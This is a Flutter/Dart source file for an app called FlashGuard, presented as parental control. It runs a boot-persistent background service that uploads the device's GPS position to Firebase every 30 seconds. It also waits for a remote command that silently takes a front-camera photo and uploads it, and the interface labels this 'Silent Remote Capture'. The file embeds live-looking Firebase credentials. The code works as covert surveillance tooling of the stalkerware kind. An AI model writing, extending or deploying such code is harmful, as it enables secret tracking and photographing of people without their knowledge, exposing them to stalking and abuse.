// ============================================================================
//  FlashGuard — Professional Parental Control App  (v4.0 — clean build)
// ============================================================================

import 'dart:async';
import 'dart:io';
import 'dart:ui';

import 'package:camera/camera.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:geolocator/geolocator.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:intl/intl.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

// ─── Firebase Config ──────────────────────────────────────────────────────────
const FirebaseOptions _kFirebaseOptions = FirebaseOptions(
  apiKey: 'AIzaSyBE8T-wOyXiBAHSRlmdyvhOlT7uCB-Lp1o',
  appId: '1:1026475439765:android:55df02c099239e8b4c4d9c',
  messagingSenderId: '1026475439765',
  projectId: 'flashguard-99c20',
  databaseURL: 'https://flashguard-99c20-default-rtdb.firebaseio.com',
  storageBucket: 'flashguard-99c20.appspot.com',
);

// ─── Constants ────────────────────────────────────────────────────────────────
const _kNotifChannelId   = 'flashguard_fg';
const _kNotifChannelName = 'FlashGuard Monitoring';
const _kDeviceIdKey      = 'fg_device_id';
const _kGpsIntervalSec   = 30;

const _kBg      = Color(0xFF080B14);
const _kCard    = Color(0xFF181C2E);
const _kPrimary = Color(0xFF7B6FFF);
const _kGreen   = Color(0xFF00E5A0);
const _kRed     = Color(0xFFFF4F6B);
const _kAmber   = Color(0xFFFFB830);

// ═══════════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: _kFirebaseOptions);

  if (FirebaseAuth.instance.currentUser == null) {
    await FirebaseAuth.instance.signInAnonymously();
  }

  await _requestPermissions();
  await _initBackgroundService();
  runApp(const FlashGuardApp());
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.locationAlways,
    Permission.camera,
    Permission.notification,
    Permission.ignoreBatteryOptimizations,
  ].request();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  BACKGROUND SERVICE
// ═══════════════════════════════════════════════════════════════════════════════

Future<void> _initBackgroundService() async {
  final service     = FlutterBackgroundService();
  final notifPlugin = FlutterLocalNotificationsPlugin();

  await notifPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(
        const AndroidNotificationChannel(
          _kNotifChannelId,
          _kNotifChannelName,
          description: 'FlashGuard is actively monitoring.',
          importance: Importance.low,
          playSound: false,
        ),
      );

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: _onServiceStart,
      isForegroundMode: true,
      autoStart: true,
      autoStartOnBoot: true,
      notificationChannelId: _kNotifChannelId,
      initialNotificationTitle: 'FlashGuard',
      initialNotificationContent: 'Monitoring active…',
      foregroundServiceNotificationId: 9001,
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: _onServiceStart,
      onBackground: _iosBackground,
    ),
  );

  service.startService();
}

@pragma('vm:entry-point')
Future<bool> _iosBackground(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  return true;
}

@pragma('vm:entry-point')
void _onServiceStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();
  await Firebase.initializeApp(options: _kFirebaseOptions);

  final prefs    = await SharedPreferences.getInstance();
  final deviceId = prefs.getString(_kDeviceIdKey) ?? const Uuid().v4();
  await prefs.setString(_kDeviceIdKey, deviceId);

  final deviceRef = FirebaseDatabase.instance.ref('devices/$deviceId');
  await deviceRef.child('meta').update({
    'online'   : true,
    'startedAt': DateTime.now().millisecondsSinceEpoch,
  });

  // GPS every 30 s
  await _pushLocation(deviceRef);
  Timer.periodic(const Duration(seconds: _kGpsIntervalSec),
      (_) => _pushLocation(deviceRef));

  // Remote camera trigger
  deviceRef.child('commands/capture').onValue.listen((event) async {
    if (event.snapshot.value == true) {
      await deviceRef.child('commands/capture').set(false);
      await _captureAndUpload(deviceRef, deviceId);
    }
  });

  // Update foreground notification every minute
  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 1), (_) {
      service.setForegroundNotificationInfo(
        title  : 'FlashGuard — Active',
        content: 'Monitoring · ${DateFormat.Hm().format(DateTime.now())}',
      );
    });
  }
}

Future<void> _pushLocation(DatabaseReference deviceRef) async {
  try {
    final position = await Geolocator.getCurrentPosition(
      desiredAccuracy: LocationAccuracy.high,
      timeLimit: const Duration(seconds: 12),
    );
    await deviceRef.child('location').set({
      'lat'      : position.latitude,
      'lng'      : position.longitude,
      'accuracy' : position.accuracy,
      'speed'    : position.speed,
      'timestamp': DateTime.now().millisecondsSinceEpoch,
    });
  } catch (_) {}
}

Future<void> _captureAndUpload(
    DatabaseReference deviceRef, String deviceId) async {
  CameraController? controller;
  try {
    final cameras = await availableCameras();
    if (cameras.isEmpty) return;

    final camera = cameras.firstWhere(
      (c) => c.lensDirection == CameraLensDirection.front,
      orElse: () => cameras.first,
    );

    controller = CameraController(camera, ResolutionPreset.medium,
        enableAudio: false);
    await controller.initialize();
    await Future.delayed(const Duration(milliseconds: 400));

    final xFile = await controller.takePicture();
    await controller.dispose();
    controller = null;

    final ts  = DateTime.now().millisecondsSinceEpoch;
    final ref = FirebaseStorage.instance
        .ref('devices/$deviceId/captures/$ts.jpg');
    await ref.putFile(File(xFile.path),
        SettableMetadata(contentType: 'image/jpeg'));
    final url = await ref.getDownloadURL();

    await deviceRef.child('captures').push().set({
      'url'      : url,
      'timestamp': ts,
    });
  } catch (_) {
    controller?.dispose();
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  APP
// ═══════════════════════════════════════════════════════════════════════════════

class FlashGuardApp extends StatelessWidget {
  const FlashGuardApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'FlashGuard',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: _kBg,
        colorScheme: const ColorScheme.dark(
          primary   : _kPrimary,
          secondary : _kGreen,
          surface   : Color(0xFF111420),
          background: _kBg,
        ),
        cardColor : _kCard,
        textTheme : GoogleFonts.interTextTheme(ThemeData.dark().textTheme),
        appBarTheme: AppBarTheme(
          backgroundColor       : _kBg,
          elevation             : 0,
          scrolledUnderElevation: 0,
          titleTextStyle: GoogleFonts.inter(
            fontSize  : 20,
            fontWeight: FontWeight.w700,
            color     : Colors.white,
          ),
        ),
        useMaterial3: true,
      ),
      home: const DashboardPage(),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  DASHBOARD
// ═══════════════════════════════════════════════════════════════════════════════

class DashboardPage extends StatefulWidget {
  const DashboardPage({super.key});
  @override
  State<DashboardPage> createState() => _DashboardPageState();
}

class _DashboardPageState extends State<DashboardPage>
    with SingleTickerProviderStateMixin {
  late final TabController _tabs;
  String _deviceId   = '';
  bool   _svcRunning = false;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 3, vsync: this);
    _load();
  }

  Future<void> _load() async {
    final prefs = await SharedPreferences.getInstance();
    final svc   = await FlutterBackgroundService().isRunning();
    if (mounted) {
      setState(() {
        _deviceId   = prefs.getString(_kDeviceIdKey) ?? '';
        _svcRunning = svc;
      });
    }
  }

  @override
  void dispose() { _tabs.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        leading: Padding(
          padding: const EdgeInsets.all(10),
          child: Icon(Icons.shield_rounded, color: _kPrimary, size: 28),
        ),
        title: const Text('FlashGuard'),
        actions: [
          _LiveBadge(running: _svcRunning),
          const SizedBox(width: 14),
        ],
        bottom: TabBar(
          controller: _tabs,
          indicatorColor     : _kPrimary,
          labelColor         : _kPrimary,
          unselectedLabelColor: Colors.white30,
          tabs: const [
            Tab(text: 'Overview'),
            Tab(text: 'Location'),
            Tab(text: 'Status'),
          ],
        ),
      ),
      body: _deviceId.isEmpty
          ? const Center(child: CircularProgressIndicator())
          : TabBarView(
              controller: _tabs,
              children: [
                _OverviewTab(deviceId: _deviceId),
                _LocationTab(deviceId: _deviceId),
                _StatusTab(deviceId: _deviceId),
              ],
            ),
    );
  }
}

// ─── Live Badge ───────────────────────────────────────────────────────────────

class _LiveBadge extends StatefulWidget {
  const _LiveBadge({required this.running});
  final bool running;
  @override
  State<_LiveBadge> createState() => _LiveBadgeState();
}

class _LiveBadgeState extends State<_LiveBadge>
    with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(
        vsync   : this,
        duration: const Duration(milliseconds: 900))
      ..repeat(reverse: true);
  }

  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final color = widget.running ? _kGreen : _kRed;
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color       : color.withOpacity(0.12),
        borderRadius: BorderRadius.circular(20),
        border      : Border.all(color: color.withOpacity(0.6)),
      ),
      child: Row(mainAxisSize: MainAxisSize.min, children: [
        FadeTransition(
          opacity: _ctrl,
          child: Container(
            width : 7, height: 7,
            decoration: BoxDecoration(color: color, shape: BoxShape.circle),
          ),
        ),
        const SizedBox(width: 6),
        Text(widget.running ? 'LIVE' : 'OFFLINE',
            style: TextStyle(
                color      : color,
                fontSize   : 10,
                fontWeight : FontWeight.w800,
                letterSpacing: 1.4)),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 1 — OVERVIEW
// ═══════════════════════════════════════════════════════════════════════════════

class _OverviewTab extends StatelessWidget {
  const _OverviewTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId');
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _SectionLabel('System Status'),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(child: _StatCard(
            stream      : ref.child('location/timestamp').onValue,
            label       : 'GPS',
            icon        : Icons.gps_fixed_rounded,
            color       : _kGreen,
            valueBuilder: (s) => s.value != null ? 'Active' : 'No Fix',
          )),
          const SizedBox(width: 12),
          Expanded(child: _StatCard(
            stream      : ref.child('meta/online').onValue,
            label       : 'Monitor',
            icon        : Icons.bar_chart_rounded,
            color       : _kPrimary,
            valueBuilder: (s) => s.value == true ? 'Online' : 'Idle',
          )),
        ]),
        const SizedBox(height: 12),
        Row(children: [
          Expanded(child: _StatCard(
            stream      : ref.child('captures').limitToLast(1).onValue,
            label       : 'Camera',
            icon        : Icons.camera_alt_rounded,
            color       : _kRed,
            valueBuilder: (s) => s.value != null ? 'Ready' : 'Idle',
          )),
          const SizedBox(width: 12),
          Expanded(child: _StatCard(
            stream      : ref.child('meta/startedAt').onValue,
            label       : 'Service',
            icon        : Icons.settings_remote_rounded,
            color       : _kAmber,
            valueBuilder: (s) => s.value != null ? 'Running' : 'Stopped',
          )),
        ]),
        const SizedBox(height: 24),
        _SectionLabel('Remote Camera Trigger'),
        const SizedBox(height: 12),
        _CameraCard(deviceId: deviceId),
        const SizedBox(height: 24),
        _SectionLabel('Recent Captures'),
        const SizedBox(height: 12),
        _CapturesList(deviceRef: ref),
      ],
    );
  }
}

class _StatCard extends StatelessWidget {
  const _StatCard({
    required this.stream,
    required this.label,
    required this.icon,
    required this.color,
    required this.valueBuilder,
  });
  final Stream<DatabaseEvent>       stream;
  final String                      label;
  final IconData                    icon;
  final Color                       color;
  final String Function(DataSnapshot) valueBuilder;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream : stream,
      builder: (ctx, snap) {
        final value = snap.hasData
            ? valueBuilder(snap.data!.snapshot)
            : '…';
        return Container(
          padding   : const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color       : _kCard,
            borderRadius: BorderRadius.circular(16),
            border      : Border.all(color: color.withOpacity(0.22)),
          ),
          child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
            Container(
              padding   : const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color       : color.withOpacity(0.14),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Icon(icon, color: color, size: 18),
            ),
            const SizedBox(height: 12),
            Text(value,
                style: TextStyle(
                    color     : color,
                    fontSize  : 15,
                    fontWeight: FontWeight.w700)),
            const SizedBox(height: 3),
            Text(label,
                style: const TextStyle(
                    color: Colors.white38, fontSize: 11)),
          ]),
        );
      },
    );
  }
}

class _CameraCard extends StatefulWidget {
  const _CameraCard({required this.deviceId});
  final String deviceId;
  @override
  State<_CameraCard> createState() => _CameraCardState();
}

class _CameraCardState extends State<_CameraCard> {
  bool _busy = false;

  Future<void> _trigger() async {
    setState(() => _busy = true);
    await FirebaseDatabase.instance
        .ref('devices/${widget.deviceId}/commands/capture')
        .set(true);
    if (mounted) {
      setState(() => _busy = false);
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
        content         : Text('Capture command sent!'),
        backgroundColor : Color(0xFF1E1E30),
        behavior        : SnackBarBehavior.floating,
      ));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Container(
      padding   : const EdgeInsets.all(18),
      decoration: BoxDecoration(
        color       : _kCard,
        borderRadius: BorderRadius.circular(18),
        border      : Border.all(color: _kRed.withOpacity(0.25)),
      ),
      child: Row(children: [
        Container(
          padding   : const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color       : _kRed.withOpacity(0.14),
            borderRadius: BorderRadius.circular(12),
          ),
          child: const Icon(Icons.camera_alt_rounded,
              color: _kRed, size: 24),
        ),
        const SizedBox(width: 14),
        const Expanded(
          child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
            Text('Silent Remote Capture',
                style: TextStyle(
                    fontWeight: FontWeight.w700, fontSize: 14)),
            SizedBox(height: 3),
            Text('Triggers front camera silently',
                style: TextStyle(
                    color: Colors.white38, fontSize: 11)),
          ]),
        ),
        const SizedBox(width: 10),
        _busy
            ? const SizedBox(
                width : 28,
                height: 28,
                child : CircularProgressIndicator(
                    strokeWidth: 2.5, color: _kRed))
            : GestureDetector(
                onTap : _trigger,
                child : Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 16, vertical: 10),
                  decoration: BoxDecoration(
                    color       : _kRed,
                    borderRadius: BorderRadius.circular(10),
                  ),
                  child: const Text('Capture',
                      style: TextStyle(
                          color     : Colors.white,
                          fontWeight: FontWeight.w700)),
                ),
              ),
      ]),
    );
  }
}

class _CapturesList extends StatelessWidget {
  const _CapturesList({required this.deviceRef});
  final DatabaseReference deviceRef;

  @override
  Widget build(BuildContext context) {
    return StreamBuilder<DatabaseEvent>(
      stream : deviceRef.child('captures').limitToLast(5).onValue,
      builder: (ctx, snap) {
        if (!snap.hasData || snap.data!.snapshot.value == null) {
          return _Empty(
            icon   : Icons.no_photography_rounded,
            message: 'No captures yet.\nUse the button above.',
          );
        }
        final raw = Map<String, dynamic>.from(
            snap.data!.snapshot.value as Map);
        final items = raw.values
            .map((e) => Map<String, dynamic>.from(e as Map))
            .toList()
          ..sort((a, b) =>
              (b['timestamp'] as int).compareTo(a['timestamp'] as int));

        return Container(
          decoration: BoxDecoration(
              color       : _kCard,
              borderRadius: BorderRadius.circular(16)),
          child: Column(
            children: items.asMap().entries.map((entry) {
              final i   = entry.key;
              final cap = entry.value;
              final ts  = cap['timestamp'] as int? ?? 0;
              final time = DateFormat('dd MMM · HH:mm')
                  .format(DateTime.fromMillisecondsSinceEpoch(ts));
              return Column(children: [
                ListTile(
                  leading: Container(
                    padding   : const EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color       : _kRed.withOpacity(0.12),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: const Icon(Icons.image_rounded,
                        color: _kRed, size: 18),
                  ),
                  title: Text('Capture ${items.length - i}',
                      style: const TextStyle(
                          fontWeight: FontWeight.w600, fontSize: 13)),
                  subtitle: Text(time,
                      style: const TextStyle(
                          color: Colors.white38, fontSize: 11)),
                ),
                if (i < items.length - 1)
                  const Divider(
                      color  : Colors.white10,
                      height : 1,
                      indent : 58),
              ]);
            }).toList(),
          ),
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 2 — LOCATION
// ═══════════════════════════════════════════════════════════════════════════════

class _LocationTab extends StatelessWidget {
  const _LocationTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final locRef =
        FirebaseDatabase.instance.ref('devices/$deviceId/location');
    return StreamBuilder<DatabaseEvent>(
      stream : locRef.onValue,
      builder: (ctx, snap) {
        if (!snap.hasData) {
          return const Center(child: CircularProgressIndicator());
        }
        if (snap.data!.snapshot.value == null) {
          return _Empty(
            icon   : Icons.location_off_rounded,
            message: 'Waiting for first GPS fix…',
          );
        }
        final loc = Map<String, dynamic>.from(
            snap.data!.snapshot.value as Map);
        final lat = (loc['lat'] as num).toDouble();
        final lng = (loc['lng'] as num).toDouble();
        final acc = (loc['accuracy'] as num?)?.toDouble() ?? 0;
        final spd = (loc['speed'] as num?)?.toDouble() ?? 0;
        final ts  = loc['timestamp'] as int? ?? 0;
        final time = DateFormat('dd MMM yyyy · HH:mm:ss')
            .format(DateTime.fromMillisecondsSinceEpoch(ts));

        return ListView(
          padding: const EdgeInsets.all(16),
          children: [
            Container(
              height    : 200,
              decoration: BoxDecoration(
                color       : _kCard,
                borderRadius: BorderRadius.circular(20),
                border      : Border.all(
                    color: _kPrimary.withOpacity(0.25)),
              ),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const Icon(Icons.location_pin,
                      color: _kRed, size: 42),
                  const SizedBox(height: 8),
                  Text(
                    '${lat.toStringAsFixed(5)}, '
                    '${lng.toStringAsFixed(5)}',
                    style: const TextStyle(
                        color     : Colors.white70,
                        fontWeight: FontWeight.w600),
                  ),
                ],
              ),
            ),
            const SizedBox(height: 16),
            Wrap(spacing: 12, runSpacing: 12, children: [
              _InfoTile('Latitude',    lat.toStringAsFixed(6)),
              _InfoTile('Longitude',   lng.toStringAsFixed(6)),
              _InfoTile('Accuracy',    '${acc.toStringAsFixed(0)} m'),
              _InfoTile('Speed',
                  '${(spd * 3.6).toStringAsFixed(1)} km/h'),
              _InfoTile('Last Update', time, wide: true),
            ]),
          ],
        );
      },
    );
  }
}

class _InfoTile extends StatelessWidget {
  const _InfoTile(this.label, this.value, {this.wide = false});
  final String label, value;
  final bool   wide;

  @override
  Widget build(BuildContext context) {
    final w = wide
        ? MediaQuery.of(context).size.width - 32
        : (MediaQuery.of(context).size.width - 44) / 2;
    return Container(
      width     : w,
      padding   : const EdgeInsets.all(14),
      decoration: BoxDecoration(
          color: _kCard, borderRadius: BorderRadius.circular(14)),
      child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
        Text(label,
            style: const TextStyle(
                color: Colors.white38, fontSize: 11)),
        const SizedBox(height: 6),
        Text(value,
            style: const TextStyle(
                color     : Colors.white,
                fontSize  : 13,
                fontWeight: FontWeight.w600)),
      ]),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  TAB 3 — STATUS
// ═══════════════════════════════════════════════════════════════════════════════

class _StatusTab extends StatelessWidget {
  const _StatusTab({required this.deviceId});
  final String deviceId;

  @override
  Widget build(BuildContext context) {
    final ref = FirebaseDatabase.instance.ref('devices/$deviceId');
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        _SectionLabel('Live Monitoring'),
        const SizedBox(height: 14),
        Container(
          padding   : const EdgeInsets.all(24),
          decoration: BoxDecoration(
              color       : _kCard,
              borderRadius: BorderRadius.circular(18)),
          child: const Column(children: [
            Icon(Icons.monitor_heart_rounded,
                color: _kPrimary, size: 48),
            SizedBox(height: 16),
            Text('FlashGuard is Active',
                textAlign: TextAlign.center,
                style: TextStyle(
                    color     : Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize  : 18)),
            SizedBox(height: 8),
            Text(
              'GPS tracked every 30 seconds.\n'
              'Remote camera capture ready.',
              textAlign: TextAlign.center,
              style: TextStyle(
                  color : Colors.white54,
                  fontSize: 13,
                  height: 1.6),
            ),
          ]),
        ),
        const SizedBox(height: 16),
        _SectionLabel('Connection Status'),
        const SizedBox(height: 12),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('location').onValue,
          builder: (ctx, snap) {
            final ok =
                snap.hasData && snap.data!.snapshot.value != null;
            return _StatusRow(
              icon   : Icons.gps_fixed_rounded,
              label  : 'GPS Location',
              value  : ok ? 'Synced to Firebase' : 'Waiting…',
              color  : ok ? _kGreen : Colors.white38,
            );
          },
        ),
        const SizedBox(height: 10),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('meta/online').onValue,
          builder: (ctx, snap) {
            final ok = snap.data?.snapshot.value == true;
            return _StatusRow(
              icon   : Icons.cloud_done_rounded,
              label  : 'Firebase Connection',
              value  : ok ? 'Connected' : 'Disconnected',
              color  : ok ? _kGreen : _kRed,
            );
          },
        ),
        const SizedBox(height: 10),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('captures').limitToLast(1).onValue,
          builder: (ctx, snap) {
            final ok =
                snap.hasData && snap.data!.snapshot.value != null;
            return _StatusRow(
              icon   : Icons.camera_alt_rounded,
              label  : 'Camera Captures',
              value  : ok ? 'Photos available' : 'No captures yet',
              color  : ok ? _kRed : Colors.white38,
            );
          },
        ),
        const SizedBox(height: 24),
        _SectionLabel('Device Info'),
        const SizedBox(height: 12),
        StreamBuilder<DatabaseEvent>(
          stream : ref.child('meta').onValue,
          builder: (ctx, snap) {
            if (!snap.hasData || snap.data!.snapshot.value == null) {
              return const SizedBox.shrink();
            }
            final meta = Map<String, dynamic>.from(
                snap.data!.snapshot.value as Map);
            final ts  = meta['startedAt'] as int? ?? 0;
            final time = ts > 0
                ? DateFormat('dd MMM · HH:mm')
                    .format(DateTime.fromMillisecondsSinceEpoch(ts))
                : 'Unknown';
            return Container(
              padding   : const EdgeInsets.all(16),
              decoration: BoxDecoration(
                  color       : _kCard,
                  borderRadius: BorderRadius.circular(14)),
              child: Column(children: [
                _MetaRow('Service Started', time),
                const Divider(color: Colors.white10),
                _MetaRow('Status',
                    meta['online'] == true ? 'Online' : 'Offline'),
              ]),
            );
          },
        ),
      ],
    );
  }
}

class _StatusRow extends StatelessWidget {
  const _StatusRow({
    required this.icon,
    required this.label,
    required this.value,
    required this.color,
  });
  final IconData icon;
  final String   label, value;
  final Color    color;

  @override
  Widget build(BuildContext context) => Container(
        padding   : const EdgeInsets.all(16),
        decoration: BoxDecoration(
            color       : _kCard,
            borderRadius: BorderRadius.circular(14)),
        child: Row(children: [
          Icon(icon, color: color, size: 22),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
              Text(label,
                  style: const TextStyle(
                      color: Colors.white38, fontSize: 11)),
              const SizedBox(height: 3),
              Text(value,
                  style: TextStyle(
                      color     : color,
                      fontWeight: FontWeight.w600,
                      fontSize  : 13)),
            ]),
          ),
        ]),
      );
}

class _MetaRow extends StatelessWidget {
  const _MetaRow(this.label, this.value);
  final String label, value;

  @override
  Widget build(BuildContext context) => Padding(
        padding: const EdgeInsets.symmetric(vertical: 6),
        child: Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
          Text(label,
              style: const TextStyle(
                  color: Colors.white38, fontSize: 12)),
          Text(value,
              style: const TextStyle(
                  color     : Colors.white,
                  fontWeight: FontWeight.w600,
                  fontSize  : 12)),
        ]),
      );
}

// ─── Shared Helpers ───────────────────────────────────────────────────────────

class _SectionLabel extends StatelessWidget {
  const _SectionLabel(this.text);
  final String text;

  @override
  Widget build(BuildContext context) => Text(
        text.toUpperCase(),
        style: const TextStyle(
            color        : Colors.white38,
            fontSize     : 10.5,
            fontWeight   : FontWeight.w700,
            letterSpacing: 1.6),
      );
}

class _Empty extends StatelessWidget {
  const _Empty({required this.icon, required this.message});
  final IconData icon;
  final String   message;

  @override
  Widget build(BuildContext context) => Center(
        child: Padding(
          padding: const EdgeInsets.all(40),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Icon(icon, size: 54, color: Colors.white10),
            const SizedBox(height: 16),
            Text(message,
                textAlign: TextAlign.center,
                style: const TextStyle(
                    color   : Colors.white30,
                    fontSize: 13,
                    height  : 1.6)),
          ]),
        ),
      );
}
